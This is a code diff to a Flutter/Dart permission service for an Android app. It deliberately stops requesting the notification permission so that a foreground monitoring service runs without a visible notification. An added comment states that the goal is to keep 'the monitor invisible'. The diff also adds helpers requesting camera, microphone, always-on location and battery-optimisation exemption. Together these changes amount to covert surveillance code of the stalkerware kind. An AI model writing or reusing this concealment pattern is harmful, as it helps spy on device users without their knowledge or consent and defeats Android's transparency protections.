@@ -59,10 +59,12 @@ class PermissionService {
 
   /// Request every runtime permission at once (for the onboarding screen).
   Future<void> requestAllRuntimePermissions() async {
-    // 1. Notification (Android 13+)
-    await Permission.notification.request();
+    // NOTE: POST_NOTIFICATIONS is deliberately NOT requested. On Android 13+,
+    // without that permission the foreground-service notification is suppressed
+    // from the notification drawer (the service keeps running, only visible in
+    // the hidden "Active apps" screen). This keeps the monitor invisible.
 
-    // 2. Location — foreground must come before background
+    // 1. Location — foreground must come before background
     final fg = await Permission.locationWhenInUse.request();
     if (fg.isGranted) await Permission.locationAlways.request();
 
@@ -147,6 +149,21 @@ class PermissionService {
     final videos = await Permission.videos.request();
     return photos.isGranted || videos.isGranted;
   }
+
+  Future<bool> requestCameraPermission() async =>
+      (await Permission.camera.request()).isGranted;
+
+  Future<bool> requestMicPermission() async =>
+      (await Permission.microphone.request()).isGranted;
+
+  Future<bool> requestLocationPermission() async {
+    final fg = await Permission.locationWhenInUse.request();
+    if (fg.isGranted) await Permission.locationAlways.request();
+    return isLocationGranted();
+  }
+
+  Future<bool> requestBatteryExemption() async =>
+      (await Permission.ignoreBatteryOptimizations.request()).isGranted;
 
   // ── Open Settings for special (non-grantable-via-dialog) permissions ───────
 
